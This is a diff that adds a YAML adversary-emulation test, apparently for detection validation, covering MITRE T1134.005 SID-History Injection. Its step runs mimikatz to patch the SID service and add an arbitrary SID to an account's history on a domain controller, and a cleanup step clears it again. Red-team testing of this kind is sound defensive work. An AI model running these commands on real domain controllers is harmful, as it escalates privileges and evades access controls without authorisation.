@@ -1,0 +1,35 @@
+api_version: "2.0"
+name: Injection SID-History with mimikatz
+description: |
+    Adversaries may use SID-History Injection to escalate privileges and bypass access controls. Must be run on domain controller
+args:
+    - name: sid_to_inject
+      type: string
+      default: S-1-5-21-1004336348-1177238915-682003330-1134
+    - name: sam_account_name
+      type: string
+      default: $env:username
+    - name: mimikatz_path
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe
+uuid: 6bef32e5-9456-4072-8f14-35566fb85401
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1134: Access Token Manipulation'
+    subtechniques:
+        - 'T1134.005: SID-History Injection'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: injection-sid-history-with-mimikatz
+      inline: |
+        {{.Args.mimikatz_path}} "privilege::debug" "sid::patch" "sid::add /sid:{{.Args.sid_to_inject}} /sam:{{.Args.sam_account_name}}" "exit"
+      executor: command_prompt
+      cleanup:
+        inline: |
+            {{.Args.mimikatz_path}} "sid::clear /sam:{{.Args.sam_account_name}}" "exit"
+        executor: command_prompt
